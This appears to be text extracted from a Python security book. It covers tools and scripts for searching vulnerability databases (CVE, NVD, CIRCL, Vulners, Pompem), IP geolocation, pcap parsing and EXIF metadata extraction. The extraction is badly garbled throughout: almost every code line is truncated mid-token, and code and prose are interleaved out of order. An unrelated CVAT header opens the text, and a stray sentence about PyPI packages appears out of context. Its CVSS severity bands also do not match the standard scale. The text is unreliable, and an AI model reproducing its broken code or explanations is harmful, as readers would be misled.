# Description: 
#CVAT is an open source interactive video and image 
#Validation has been added to the URLs used in the a

CVE provides a database of vulnerabilities, which is very useful
because, in addition to analyzing the vulnerability in question, it
oﬀers many references in which we often ﬁnd direct links to exploits
that aĴack this vulnerability.
For example, if we look for openssl in CVE, it oﬀers us the
following vulnerabilities found in speciﬁc libraries that are using this
security module: https://cve.mitre.org/cgi-bin/cvekey.cgi?
keyword=openssl:
Figure 11.3: CVE vulnerabilities related to openssl
At the following URL, we can see the details of the ﬁrst CVE
vulnerability found in 2023:

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-
2023-0001
Figure 11.4: First CVE vulnerability found in 2023
In the details of the CVE, we can see a description of the
vulnerability, including aﬀected versions and operating systems,
references for more detailed information, the creation date, and
whether it has been assigned to be resolved.
Another interesting search service is https://cve.circl.lu/. This
service gives you the possibility to obtain recently discovered CVEs
and search by the vendor. This search engine allows us to obtain
both the list of registered CVEs and the details of each CVE as
references and their level of impact.

Figure 11.5: CIRCL CVE Search service
Next, we could use Python to perform a search within the CIRCL
and GitHub services. You can ﬁnd the following code in the GitHub
repository in the ﬁle search_cve_circl_github.py.
import urllib.request, json, sys, textwrap 
import argparse 
def cveSearch(cve): 
    with urllib.request.urlopen('http://cve.circl.lu
        data = json.loads(url.read().decode()) 
        try: 
            if data['cvss']: 
                print("{} | CVSS {}".format(cve,data
            if data['summary']: 
                print('+-- Summary '+'-'*68+"\n") 

The above code allows us to perform a search on the CIRCL service
and obtain information for a speciﬁc CVE. For example, we can ﬁnd
exploits found in the ExploitDB database. We continue by
implementing a function that allows us to use the GitHub service to
ﬁnd those repositories related to a CVE:
                print('\n'.join(textwrap.wrap(data[
            if data['exploit-db']: 
                print('+-- ExploitDB '+'-'*66) 
                for d in data['exploit-db']: 
                    print("| Title | {}".format(d['t
                    print("|   URL | {}".format(d['s
                    print("+-------+"+"-"*71) 
        except (TypeError, KeyError) as e: 
            pass
def gitHubSearch(cve): 
    with urllib.request.urlopen('https://api.github
    data = json.loads(url.read().decode()) 
    try: 
        print('GitHub Repositories:') 
        for i in data['items']: 
            print("|  Repository | {}".format(i['ful
            print("|  Description | {}".format(i['de
            print("|   URL | {}".format(i['html_url
            print("---------------------------------
    except (TypeError, KeyError) as e: 
            pass

The following execution shows the results for the CVE-2022-1012,
where we can see a summary and GitHub repositories related to the
mentioned CVE.
Now, we are going to review how to search for vulnerabilities in the
NVD.
Searching for vulnerabilities in the
NVD
In this section, we’ll look at how to search for and ﬁnd vulnerabilities
in NIST’s NVD.
Introducing NIST’s NVD
If we use the NIST NVD to get information about a speciﬁc CVE
identiﬁer, then we can see more information including the severity
$ python search_cve_circl_github.py --cve CVE-2022-1
+-- Summary ----------------------------------------
 A memory leak problem was found in the TCP source p
net/ipv4/tcp.c due to the small table perturb size. 
attacker to information leak and may cause a denial 
GitHub Repositories: 
|  Repository | nanopathi/Linux-4.19.72_CVE-2022-101
|  Description | None 
|   URL | https://github.com/nanopathi/Linux-4.19.72
--------------------------------------------- 

of the vulnerability, a Common Vulnerability Scoring System
(CVSS) code, and a base score depending on the criticality level. For
example, the following URL –
https://nvd.nist.gov/vuln/detail/CVE-2023-0001 – contains
information about the ﬁrst vulnerability found in 2023.
CVSS scores provide a set of standard criteria that makes it possible
to determine which vulnerabilities are more likely to be successfully
exploited. The CVSS score introduces a system for scoring
vulnerabilities, considering a set of standardized and easy-to-
measure criteria.
Vulnerabilities are given a high, medium, or low severity in the scan
report. The severity is dependent on the score assigned to the CVE
by the CVSS. The vendor’s score is used by most vulnerability
scanners to reliably measure the severity:
High: The vulnerability has a baseline CVSS score ranging from
8.0 to 10.0.
Medium: The vulnerability has a baseline CVSS score ranging
from 4.0 to 7.9.
Low: The vulnerability has a baseline CVSS score ranging from
0.0 to 3.9.
The CVSS aims to estimate the impact of a vulnerability and is made
up of the following three main groups of metrics:
Base group: These are the features of a vulnerability that are
independent of time and the environment.
Temporal group: These are the features of a vulnerability that
change over time.

Environmental group: These are the features of a vulnerability
that are related to the user’s environment.
Version 3 of the CVSS was created with the goal of changing certain
metrics and adding some new ones – for example, the scope metric,
which aĴempts to complement the global assessment of the base
metrics and give the result a value depending on which privileges
and which resources are aﬀected by the exploitation of the
vulnerability.
With this analysis, you can observe the diﬀerent vulnerabilities any
user can exploit, since they are accessible through the Internet. Later
on, we will learn how to search for these vulnerabilities with
diﬀerent search engines.
Searching for vulnerabilities
Another way to ﬁnd a vulnerability is to research public records. For
example, CVE Details – https://www.cvedetails.com – is a
service where you can ﬁnd data on common vulnerabilities in a
convenient, graphical interface. This website organizes its categories
by vendors, products, date of registration, and vulnerability type.
There, you will ﬁnd all the latest public vulnerabilities and you can
ﬁlter the information precisely. In the following screenshot, we can
see the current CVSS Score Distribution for all vulnerabilities.

Figure 11.6: CVSS Score Distribution for all vulnerabilities
Additionally, CVE Details provides additional data about the CVE
vulnerability in question, such as, for example, the severity or
criticality level. This level is determined by the CVSS code, a
numerical value that represents the criticality level of the
vulnerability.
CVE Details is an appropriate alternative to complement the oﬃcial
CVE Security program website, as it provides even more detailed
information about each bug than this website does.
Obviously, malicious packages that have been detected have been
removed from the repository by the PyPI security team, but we will
likely encounter such cases in the future.

Next, we could use Python to perform a search within the NVD. You
can ﬁnd the following code in the GitHub repository in the ﬁle
cve_search_nvd_database.py.
In the previous code, we deﬁned a function that allows us to use the
NVD to perform the search for the word that we pass as a
parameter. For each CVE found, what we do is to query the
cvedetail.com service to obtain the description of the
vulnerability. We ﬁnalize the previous script, building our main
import requests 
import re 
import sys 
def get_cve_info(query): 
    nvd_url = f"https://nvd.nist.gov/vuln/search/res
    response = requests.get(nvd_url) 
    if response.status_code == 200: 
        html_content = response.text 
        cve_ids = re.findall(r'href="/vuln/detail/CV
        if cve_ids: 
            cve_ids.sort() 
            print("\nCVEs found for", query, ":") 
            for cve_id in cve_ids: 
                cve_url = f"https://www.cvedetails.c
                cve_response = requests.get(cve_url)
                if cve_response.status_code == 200: 
                    cve_html_content = cve_response
                    cve_summary = re.search(r'<div c
                    print("\n", cve_id, ":", cve_sum

program with information regarding the parameters necessary for its
execution.
The following execution shows the results for the search for
vulnerabilities related to openssl.
if __name__ == '__main__': 
    if len(sys.argv) == 2 and sys.argv[1] == '-h': 
        print("\n" 'Usage mode: python cve_search_nv
        print('Example: python3 cve_search_nvd_datab
        sys.exit() 
    elif len(sys.argv) != 2: 
        print("\n" 'Usage mode: python cve_search_nv
        sys.exit() 
    query = sys.argv[1] 
    get_cve_info(query) 
$ python cve_search_nvd_database.py "openssl"  
CVEs found for openssl : 
2022-0517 :  
Mozilla VPN can load an OpenSSL configuration file f
<span class="datenote"> 
Publish Date : 2022-12-22  Last Update Date : 2022-1
2022-3358 :  
OpenSSL supports creating a custom cipher via the le
<span class="datenote"> 
Publish Date : 2022-10-11  Last Update Date : 2022-1
The tool also offers the possibility to search by CV
$ python cve_search_nvd_database.py "CVE-2023-0001" 

Next, we’ll review how we can use the Vulners service and API to
search for vulnerabilities.
Searching for vulnerabilities in the
Vulners database
In this section, we’ll look at how to ﬁnd vulnerabilities in the Vulners
database.
Vulners – https://pypi.org/project/vulners – is a Python
library for the Vulners database, which provides search capability,
data retrieval, archiving, and API vulnerability scanning for
integration purposes. With this library, you can create security tools
and get access to the world’s largest security database. Since the
package is available on PyPI, you can use the following command
for the installation:
$ pip install vulners 
All collections are listed at https://vulners.com/#stats. For
example, we could search for vulnerabilities with CVSS High Scores
CVEs found for CVE-2023-0001 : 
2023-0001 :  
An information exposure vulnerability in the Palo Al
<span class="datenote"> 
Publish Date : 2023-02-08  Last Update Date : 2023-0

at https://vulners.com/search?query=cvss.score:
[6%20TO%2010]%20AND%20order:published.
Figure 11.7: Searching in the Vulners database by CVSS score
Also, we can search for Linux vulnerabilities:
https://vulners.com/search?
query=bulletinFamily:unix%20order:published.
It is important to remember that to use the Vulners API from Python,
we need to register and get the API key to query the API. The
following script allows you to test some of the methods oﬀered by
the Python API to obtain information about a speciﬁc vulnerability.

You can ﬁnd the following code in the GitHub repository in the ﬁle
search_vulners.py.
In the previous script, we are using the Vulners API to get
information about documents by CVE identiﬁer and get references
for the vulnerability.
The following execution is a partial output where information about
the ﬁrst CVE identiﬁer found in the year 2023 is obtained.
import vulners 
vulners_api = vulners.Vulners(api_key="API_KEY") 
openssl = vulners_api.find_all(query="openssl", limi
for i, val in enumerate(openssl): 
    for key,value in val.items(): 
        print(key,":",value) 
CVE_2023_001 = vulners_api.document("CVE-2023-0001")
for key,value in CVE_2023_001.items(): 
    print(key,":",value) 
references = vulners_api.get_bulletin_references("CV
for key,value in references.items(): 
    for key,val in enumerate(value): 
        for key,value in val.items(): 
            print(key,":",value) 
id : CVE-2023-0001 
type : cve 
bulletinFamily : NVD 
title : CVE-2023-0001 
description : An information exposure vulnerability 

Next, we will review how we search for vulnerabilities with other
tools like Pompem.
published : 2023-02-08T18:15:00 
modified : 2023-02-18T20:41:00 
cvss : {'score': 0.0, 'vector': 'NONE'} 
href : https://web.nvd.nist.gov/view/vuln/detail?vul
cvelist : ['CVE-2023-0001'] 
lastseen : 2023-02-18T21:42:56 
enchantments : {'vulnersScore': 'PENDING'} 
lastseen : 2023-02-18T22:22:16 
description : An information exposure vulnerability 
**Work around:** 
There are no known workarounds for this issue. 
cvss3 : {'exploitabilityScore': 0.8, 'cvssV3': {'bas
published : 2023-02-08T17:00:00 
type : paloalto 
title : Cortex XDR Agent: Cleartext Exposure of Agen
bulletinFamily : software 
cvss2 : {} 
cvelist : ['CVE-2023-0001'] 
modified : 2023-02-08T17:00:00 
id : PA-CVE-2023-0001 
href : https://securityadvisories.paloaltonetworks.c
cvss : {'score': 0.0, 'vector': 'NONE'} 
lastseen : 2023-02-18T22:22:16 
description : A file disclosure vulnerability in the

Searching for vulnerabilities with
Pompem
In this section, we’ll look at how to ﬁnd vulnerabilities with other
tools like Pompem. Since it is impossible to be always up to date
with all the vulnerabilities and exploits that have been discovered
for the main systems and servers, there are large databases
responsible for recording all these security ﬂaws so that anyone can
consult them. These databases are usually open source. For this
reason, there are tools designed to help us perform queries in these
databases with greater convenience.
Pompem (https://github.com/rfunix/Pompem) is one of the most
complete tools we can ﬁnd today to search for vulnerabilities and
exploits for all types of platforms and servers. This tool, developed
in Python, automatically searches for all kinds of vulnerabilities and
exploits in the most important databases, such as, for example:
PacketStorm
CXSecurity
ZeroDay
Vulners
NVD
WPScan Vulnerability Database
In addition, it has an advanced search system focused on helping
ethical hackers and security researchers in their work. To install
Pompem on your computer, simply run the following command
from a console:

$ pip install -r requirements.txt 
The wizard itself will take care of analyzing the system and
downloading and installing everything necessary for this tool to
work. This application is compatible with virtualenv, so we can keep
the whole application and all dependencies isolated from the rest of
the Python ecosystem.
Once we have everything installed and ready, we can start using this
tool. The ﬁrst thing we will do is to see the help of the program to
get an idea of how it works:
Broadly speaking, the most important thing is to use the -s
parameter to search for one or more keywords, and the -txt and -
html parameters to choose the format in which we want to export
the information. For example, if we want to search for vulnerabilities
in Python, and save the results in HTML, the speciﬁc command
would be:
$ python pompem.py -h 
Options: 
  -h, --help                      show this help mes
  -s, --search <keyword,keyword,keyword>  text for s
  --txt                           Write txt File 
  --html                          Write html File 
$ python pompem.py -s Python –html 
+Date            Description                        

We could also look for vulnerabilities in certain protocols:
$ python pompem.py -s ssh,ftp,mysql –txt 
In the source code, we can see the various services this tool is using
for searching for vulnerabilities.
For example, the PacketStorm class is responsible for searching
vulnerabilities in the service https://packetstormsecurity.com.
You can ﬁnd the following code in the GitHub repository of the
project:
https://github.com/rfunix/Pompem/blob/master/core/scrap
ers.py:
+---------------------------------------------------
+ 2023-03-07 | Ubuntu Security Notice USN-5931-1 | h
+---------------------------------------------------
+ 2023-03-07 | Ubuntu Security Notice USN-5930-1 | h
+---------------------------------------------------
+ 2023-03-07 | Ubuntu Security Notice USN-5767-3 | h
class PacketStorm(Scraper): 
    def __init__(self, key_word): 
        Scraper.__init__(self) 
        self.name_site = "Packet Storm Security" 
        self.name_class = PacketStorm.__name__ 
        self.base_url = "https://packetstormsecurity
        self.key_word = key_word 
        self.url = "https://packetstormsecurity.com/

For example, if we are looking for vulnerabilities related to Python,
these are the main services that the tool uses to perform the searches:
        self.page_max = 2 
        self.list_result = [] 
        self.regex_item = re.compile(r'(?ms)(<dl id=
        self.regex_url = re.compile(r'href="(/files/
        self.regex_date = re.compile(r'href="/files/
        self.regex_name = re.compile(r'href="/files/
    def run(self, ): 
        for page in range(self.page_max): 
            try: 
                url_search = self.url.format(page + 
                req_worker = RequestWorker(url_searc
                req_worker.start() 
                self.list_req_workers.append(req_wor
            except Exception as e: 
                import traceback 
                traceback.print_exc() 
        self._get_results() 
    def _parser(self, html): 
        for item in self.regex_item.finditer(html): 
            item_html = item.group(0) 
            dict_result = {} 
            url_exploit = "{0}{1}".format( 
            self.base_url, 
            self.regex_url.search(item_html).group(1
            dict_result['url'] = url_exploit 
            dict_result['date'] = self.regex_date.se
            dict_result['name'] = self.regex_name.se
            self.list_result.append(dict_result) 

https://nvd.nist.gov/vuln/search/results?
form_type=Basic&results_type=overview&query=python&
search_type=all&isCpeNameSearch=false
https://0day.today/search?search_request=python
https://cxsecurity.com/search/wlb/DESC/AND/2023.2.2
6.1999.1.1/0/10/python/
https://packetstormsecurity.com/search/?
q=python&s=files
As we can see, Pompem is one of the most complete tools we can
ﬁnd to search for vulnerabilities and exploits for any operating
system, server, or service, or for any device from any manufacturer.
The information, thanks to the fact that it performs queries in the
most important databases, is always updated with the latest security
breaches.
Summary
In this chapter, the objective was to provide speciﬁc search engines
to obtain more information about a vulnerability. We have analyzed
the main databases for searching CVE identiﬁers, as well as how we
could automate the extraction process using Python.
In the next chapter, we will introduce the main modules we have in
Python for extracting information about geolocation IP addresses;
extract metadata from images and PDF documents; and identify the
web technology used by a website. Also, we will cover how to
extract metadata for Chrome and Firefox browsers and information

related to downloads, cookies, and history data stored in the SQLite
database.
Questions
As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. What is an exploit and how could you aĴack a vulnerability?
2. What is the meaning of the CVSS codes from a vulnerability
point of view?
3. Which organization is responsible for creating and maintaining
the CVE database?
4. Which service can be used to ﬁnd data on common
vulnerabilities and organizes its categories by vendors,
products, date of registration, and vulnerability type?
5. Which method from the Vulners API can you use to get
references for a speciﬁc CVE identiﬁer?
Further reading
The Vulners API: https://github.com/vulnersCom/api
Vulners samples:
https://github.com/vulnersCom/api/tree/master/sampl
es
Join our community on Discord

Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

————————— Section 5
—————————
Python Forensics
In this section, you will learn tools for applying forensics techniques,
using Python to extract metadata from documents, images, and
browsers, execute brute-force aĴacks, and apply cryptography
techniques and code obfuscation.
This part of the book comprises the following chapters:
Chapter 12, Extracting Geolocation and Metadata from Documents,
Images, and Browsers
Chapter 13, Python Tools for Brute-Force AĴacks
Chapter 14, Cryptography and Code Obfuscation

12
Extracting Geolocation and
Metadata from Documents,
Images, and Browsers
Metadata consists of a series of tags that describe various
information about a ﬁle. The information they store can vary widely
depending on how the ﬁle was created and with what format,
author, creation date, and operating system.
This chapter covers the main modules we have in Python for
extracting information about a geolocation IP address, extracting
metadata from images and documents, and identifying the web
technology used by a website. Also, we will cover how to extract
metadata for the Chrome and Firefox browsers and extract
information related to downloads, cookies, and history data stored
in the SQLite database.
This chapter will provide us with basic knowledge about diﬀerent
tools we’ll need to use to know the geolocation of a speciﬁc IP
address and extract metadata from many resources, such as
documents, images, and browsers.
The following topics will be covered in this chapter:

Extracting geolocation information using python-geoip and
maxminddb-geolite2
Extracting metadata from images with the exif tool and PIL
python module
Extracting metadata from PDF documents with the PyPDF2 and
PyMuPDF modules
Identifying the technology used by a website
Extracting metadata from web browsers
Technical requirements
Before you start reading this chapter, you should know the basics of
Python programming and have some basic knowledge about HTTP.
We will work with Python version 3.10, which is available at
www.python.org/downloads.
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
Check out the following video to see the Code in Action:
https://packt.link/Chapter12.
Extracting geolocation information
One way to obtain geolocation from an IP address or a domain is by
using a service that provides location data such as the country,
latitude, and longitude. Among the services that provide this

information in an easy way, hackertarget.com is a popular service
with quality location data (https://hackertarget.com/geoip-
ip-location-lookup). This service also provides a REST API for
obtaining geolocation from an IP address using the
https://api.hackertarget.com/geoip/?q=8.8.8.8 endpoint:
IP Address: 8.8.8.8 
Country: United States 
State: California 
City: Los Angeles 
Latitude: 34.0544 
Longitude: -118.2441 
We can use similar services to get geolocation, such as https://ip-
api.com. This service provides an endpoint to get geolocation by IP
address: http://ip-api.com/json/8.8.8.8. In the following
script, we are using this service and the requests module to obtain
a JSON response with geolocation information. You can ﬁnd the
following code in the ip_geolocation.py ﬁle inside the
geolocation folder:
import requests 
class IPGeolocation(object): 
    def __init__(self, ip_address): 
        self.latitude = '' 
        self.longitude = '' 
        self.country = '' 
        self.city = '' 
        self.time_zone = '' 

The output of the previous script will be like the one shown here:
Python modules for extracting
geolocation information
        self.ip_address = ip_address 
        self.get_location() 
    def get_location(self): 
        json_request = requests.get('http://ip-api.c
        print(json_request) 
        if 'country' in json_request.keys(): 
            self.country = json_request['country'] 
        if 'countryCode' in json_request.keys(): 
            self.country_code = json_request['countr
        if 'timezone' in json_request.keys(): 
            self.time_zone = json_request['timezone
        if 'city' in json_request.keys(): 
            self.city = json_request['city'] 
        if 'lat' in json_request.keys(): 
            self.latitude = json_request['lat'] 
        if 'lon' in json_request.keys(): 
            self.longitude = json_request['lon'] 
if __name__ == '__main__': 
    geolocation = IPGeolocation('151.101.1.168') 
    print(geolocation.__dict__) 
{'status': 'success', 'country': 'United States', 'c
{'latitude': 37.721, 'longitude': -122.391, 'country

Now that we have reviewed some services to obtain geolocation
from the IP address, we are going to review the main modules that
we ﬁnd in Python to obtain this information. We’ll be working with
the following modules:
geoip-python3: Provides GeoIP functionality for Python
(https://pypi.org/project/python-geoip-python3)
python-geoip-geolite2: Provides access to the geolite2
database. This product includes GeoLite2 data created by
MaxMind, available from http://www.maxmind.com
geoip2: Provides access to the GeoIP2 web services and
databases (https://github.com/maxmind/GeoIP2-python,
https://pypi.org/project/geoip2/)
maxminddb-geolite2: Provides a simple MaxMindDB reader
extension (https://github.com/rr2do2/maxminddb-
geolite2)
geoip-python3 and python-geoip-geolite2 can be installed
using the following commands:
$ pip install python-geoip-python3 
$ pip install python-geoip-geolite2 
In the following script, we will obtain geolocation from an IP
address using the lookup() method. You can ﬁnd the following
code in the geoip_python3.py ﬁle inside the geolocation folder:
import argparse 
import socket 

In the following output, we can see the execution of the previous
script using the python.org domain as a hostname:
$ python geoip_python3.py --hostname python.org  
IP address: 151.101.129.168 
Country:  US 
Time zone:  America/New_York 
Location:  (42.9956, -71.4548) 
Now we are going to review the geoip2 module. We can install it
with the following command:
$ pip install geoip2 
from geoip import geolite2 
import json 
parser = argparse.ArgumentParser(description='Get IP
parser.add_argument('--hostname', action="store", de
given_args = parser.parse_args() 
hostname = given_args.hostname 
ip_address = socket.gethostbyname(hostname) 
print("IP address: {0}".format(ip_address)) 
geolocation = geolite2.lookup(ip_address) 
if geolocation is not None: 
    print('Country: ',geolocation.country) 
    print('Time zone: ', geolocation.timezone) 
    print('Location: ', geolocation.location) 

In the following script, we are using this module to obtain
geolocation from an IP address using the GeoLite2-City.mmdb
database. You can ﬁnd the following code in the
geoip2_python3.py ﬁle inside the geolocation folder:
In the following output, we can see the execution of the previous
script using the python.org domain as a hostname:
import argparse 
import geoip2.database 
import socket 
def geolocation(ip_address): 
    with geoip2.database.Reader('GeoLite2-City.mmdb
        rec = gi.city(ip_address) 
        city = rec.city.name 
        region = rec.subdivisions.most_specific.name
        country = rec.country.name 
        continent = rec.continent.name 
        latitue = rec.location.latitude 
        longitude = rec.location.longitude 
        print(f'[*] Target: {ip_address} Geo-located
        print(f'[+] {city}, {region}, {country}, {co
        print(f'[+] Latitude: {latitue}, Longitude: 
if __name__ == "__main__": 
    parser = argparse.ArgumentParser(description='Ge
    parser.add_argument('--hostname', action="store"
    given_args = parser.parse_args() 
    hostname = given_args.hostname 
    ip_address = socket.gethostbyname(hostname) 
    geolocation(ip_address) 

In the following example, the objective is to read a pcap ﬁle and
obtain the geolocation of the packets involved in the communication.
For this task, we are introducing a new module called dpkt
(https://pypi.org/project/dpkt), which allows you to read the
packets inside a pcap file. You can ﬁnd the following code in the
geolocation_packets_pcap.py ﬁle inside the geolocation
folder:
$ python geoip2_python3.py --hostname scanme.nmap.or
[*] Target: 45.33.32.156 Geo-located. 
[+] Fremont, California, United States, North Americ
[+] Latitude: 37.5625, Longitude: -122.0004 
import dpkt 
import socket 
import geoip2.database 
import argparse 
def geolocation(ip_address): 
    try: 
        with geoip2.database.Reader('GeoLite2-City.m
            rec = gi.city(ip_address) 
            city = rec.city.name 
            country = rec.country.name 
            continent = rec.continent.name 
            latitue = rec.location.latitude 
            longitude = rec.location.longitude 
            return f'{city}, {country}, {continent},
    except Exception as e: 
        print(f'{"":>3}[-] Exception: {e.__class__._

In the previous code, we deﬁne a function that accepts the IP address
as a parameter and obtains the geolocation using the database
GeoLite2-City.mmdb. We continue with a function that allows us
to read each of the packets found in the pcap ﬁle and obtain the
source and destination IP addresses:
Finally, our main program allows asking the user for the input ﬁle
and use the dpkt module to read the pcap ﬁle passed as a
parameter.
def read_pcap(pcap_file): 
    for ts, buf in pcap_file: 
        try: 
            eth = dpkt.ethernet.Ethernet(buf) 
            ip = eth.data 
            src = socket.inet_ntoa(ip.src) 
            dst = socket.inet_ntoa(ip.dst) 
            print(f'[+] Src: {geolocation(src)} --> 
        except Exception as exception: 
            print(f'{"":>3}[-] Exception: {exception
            pass 
if __name__ == '__main__': 
    parser = argparse.ArgumentParser(usage='python3 
    parser.add_argument('--pcap', type=str,help="spe
    args = parser.parse_args() 
    pcap = args.pcap 

In the following output, we can see the execution of the previous
script using the geolocation.pcap ﬁle, which contains packets
involved in communication.
Now we are going to review the maxminddb-geolite2 module. We
can install it with the following command:
$ pip install maxminddb-geolite2 
In the following script, we can see an example of how to use the
maxminddb-geolite2 module. You can ﬁnd the following code in
the maxminddb_geolite2_reader.py ﬁle inside the geolocation
folder:
    with open(pcap, 'rb') as file: 
        pcap = dpkt.pcap.Reader(file) 
        read_pcap(pcap) 
$ python geolocation_packets_pcap.py --pcap geolocat
[+] Src: Naju, South Korea, Asia, 34.9066 126.6651 -
[+] Src: None, United States, North America, 37.751 
[+] Src: None, United States, North America, 37.751 
[+] Src: None, South Korea, Asia, 37.5112 126.9741 -
[+] Src: None, United States, North America, 37.751 
[+] Src: None, Singapore, Asia, 1.3667 103.8 --> Dst
[+] Src: None, Japan, Asia, 35.69 139.69 --> Dst: No
[+] Src: Gourock, United Kingdom, Europe, 55.9616 -4
[+] Src: None, Australia, Oceania, -33.494 143.2104 

In the following output, we can see the execution of the previous
script using the python.org domain as a hostname:
import socket 
from geolite2 import geolite2 
import argparse 
import json 
parser = argparse.ArgumentParser(description='Get IP
parser.add_argument('--hostname', action="store", de
given_args = parser.parse_args() 
hostname = given_args.hostname 
ip_address = socket.gethostbyname(hostname) 
print("IP address: {0}".format(ip_address)) 
reader = geolite2.reader() 
response = reader.get(ip_address) 
print (json.dumps(response,indent=4)) 
print ("Continent:",json.dumps(response['continent']
print ("Country:",json.dumps(response['country']['na
print ("Latitude:",json.dumps(response['location'][
print ("Longitude:",json.dumps(response['location'][
print ("Time zone:",json.dumps(response['location'][
$ python maxminddb_geolite2_reader.py --hostname pyt
IP address: 151.101.193.168 
{ 
    "city": { 
        "geoname_id": 5391959, 
        "names": { 
            "de": "San Francisco", 

            "en": "San Francisco", 
            "es": "San Francisco", 
            "fr": "San Francisco", 
            "ja": "\u30b5\u30f3\u30d5\u30e9\u30f3\u3
            "pt-BR": "S\u00e3o Francisco", 
            "ru": "\u0421\u0430\u043d-\u0424\u0440\u
            "zh-CN": "\u65e7\u91d1\u5c71" 
        } 
    }, 
    "continent": { 
        "code": "NA", 
        "geoname_id": 6255149, 
        "names": { 
            "de": "Nordamerika", 
            "en": "North America", 
            "es": "Norteam\u00e9rica", 
            "fr": "Am\u00e9rique du Nord", 
            "ja": "\u5317\u30a2\u30e1\u30ea\u30ab", 
            "pt-BR": "Am\u00e9rica do Norte", 
            "ru": "\u0421\u0435\u0432\u0435\u0440\u0
            "zh-CN": "\u5317\u7f8e\u6d32" 
        } 
    }, 
    "country": { 
        "geoname_id": 6252001, 
        "iso_code": "US", 
        "names": { 
            "de": "USA", 
            "en": "United States", 
            "es": "Estados Unidos", 
            "fr": "\u00c9tats-Unis", 
            "ja": "\u30a2\u30e1\u30ea\u30ab\u5408\u8

In the previous output, we can see information about the city,
continent, and country. We continue with the output where we can
highlight information about the latitude, longitude, time zone, postal
code, registered country, and subdivision within the country:
            "pt-BR": "Estados Unidos", 
            "ru": "\u0421\u0428\u0410", 
            "zh-CN": "\u7f8e\u56fd" 
        } 
    }, 
"location": { 
        "accuracy_radius": 1000, 
        "latitude": 37.7697, 
        "longitude": -122.3933, 
        "metro_code": 807, 
        "time_zone": "America/Los_Angeles" 
    }, 
    "postal": { 
        "code": "94107" 
    }, 
    "registered_country": { 
        "geoname_id": 6252001, 
        "iso_code": "US", 
        "names": { 
            "de": "USA", 
            "en": "United States", 
            "es": "Estados Unidos", 
            "fr": "\u00c9tats-Unis", 
            "ja": "\u30a2\u30e1\u30ea\u30ab\u5408\u8

We conclude the output with a summary of the geolocation, showing
information about the continent, country, latitude, longitude, and
            "pt-BR": "Estados Unidos", 
            "ru": "\u0421\u0428\u0410", 
            "zh-CN": "\u7f8e\u56fd" 
        } 
    }, 
    "subdivisions": [ 
        { 
            "geoname_id": 5332921, 
            "iso_code": "CA", 
            "names": { 
                "de": "Kalifornien", 
                "en": "California", 
                "es": "California", 
                "fr": "Californie", 
                "ja": "\u30ab\u30ea\u30d5\u30a9\u30e
                "pt-BR": "Calif\u00f3rnia", 
                "ru": "\u041a\u0430\u043b\u0438\u044
                "zh-CN": "\u52a0\u5229\u798f\u5c3c\u
            } 
        } 
    ] 
} 
Continent: "North America" 
Country: "United States" 
Latitude: 37.7697 
Longitude: -122.3933 
Time zone: "America/Los_Angeles" 

time zone.
Now that we have reviewed the main modules to obtain geolocation
from the IP address or domain, we are going to review the main
modules that we ﬁnd in Python to extract metadata from images.
Extracting metadata from images
In this section, we will review how to extract EXIF metadata from
images with the PIL module. EXchangeable Image File Format
(EXIF) is a speciﬁcation that adds metadata to certain types of image
formats. Typically, JPEG and TIFF images contain this type of
metadata. EXIF tags usually contain camera details and seĴings used
to capture an image but can also contain more interesting
information such as author copyright and geolocation data.
Introduction to EXIF and the PIL
module
One of the main modules that we ﬁnd within Python for the
processing and manipulation of images is the Python Imaging
Library (PIL). The PIL module allows us to extract the metadata of
images in EXIF format. We can install it with the following
command:
$ pip install pillow 
EXIF is a speciﬁcation that indicates the rules that must be followed
when we are going to save images and deﬁnes how to store

metadata in image and audio ﬁles. This speciﬁcation is applied
today within most mobile devices and digital cameras. The
PIL.ExifTags module allows us to extract information from TAGS
and GPSTAGS with the following format:
ExifTags contains a dictionary structure that contains constants
and names for many well-known EXIF tags. In the following output,
we can see all tags returned by the TAGS.values() method:
In the previous output, we can see some of the tag values we can
process to get metadata information from images. Now that we have
reviewed the main tags that we can extract from an image, we’ll
continue to analyze the sub-modules that we have within the PIL
module for extracting the information from these tags.
>>> import PIL.ExifTags 
>>> help(PIL.ExifTags) 
Help on module PIL.ExifTags in PIL: 
NAME 
    PIL.ExifTags 
DATA 
    GPSTAGS = {0: 'GPSVersionID', 1: 'GPSLatitudeRef
    TAGS = {11: 'ProcessingSoftware', 254: 'NewSubfi
>>> from PIL.ExifTags import TAGS 
>>> print(TAGS.values()) 
dict_values(['ProcessingSoftware', 'NewSubfileType',
...

Getting the EXIF data from an image
In this section, we will review the PIL submodules for obtaining
EXIF metadata from images.
First, we import the PIL.image and PIL.TAGS modules. PIL is an
image-processing module in Python that supports many ﬁle formats
and has a powerful image-processing capability. Then, we iterate
through the results and print the values. In this example, to acquire
the EXIF data, we can use the _getexif() method. You can ﬁnd the
following code in the get_exif_tags.py ﬁle in the exiftags
folder:
from PIL import Image 
from PIL.ExifTags import TAGS 
def get_exif_tags(): 
    ret = {} 
    i = Image.open('images/image.jpg') 
    info = i._getexif() 
    for tag, value in info.items(): 
        decoded = TAGS.get(tag, tag) 
        ret[decoded] = value 
    return ret 
print(get_exif_tags()) 
In the previous script, we are using the _getexif() method to
obtain the information of the EXIF tags from an image located in the
images folder. In the following output, we can see the execution of
the previous script:

We can iterate on the previous script with functions that return EXIF
tag metadata from a given image path. You can ﬁnd the following
code in the extractDataFromImages.py ﬁle in the exiftags
folder:
def get_exif_metadata(image_path): 
    exifData = {} 
    image = Image.open(image_path) 
    if hasattr(image, '_getexif'): 
        exifinfo = image._getexif() 
        if exifinfo is not None: 
            for tag, value in exifinfo.items(): 
                decoded = TAGS.get(tag, tag) 
                exifData[decoded] = value 
    decode_gps_info(exifData) 
    return exifData 
We could improve the information related to GPSInfo by decoding
the information into latitude-longitude value format. The
convert_to_degress(values) method allows us to convert the
GPS coordinates stored in the EXIF into degrees in ﬂoat format. In
the decode_gps_info(exif) method, we provide an EXIF object as
a parameter that contains information stored in a GPSInfo object,
decode that information, and parse data related to geo references:
$ python get_exif_tags.py 
{'GPSInfo': {0: b'\x00\x00\x02\x02', 1: 'N', 2: (32

In the previous script, we parse the information contained in the
EXIF array. If this array contains information related to
def convert_to_degress(value): 
    d = float(value[0]) 
    m = float(value[1]) 
    s = float(value[2]) 
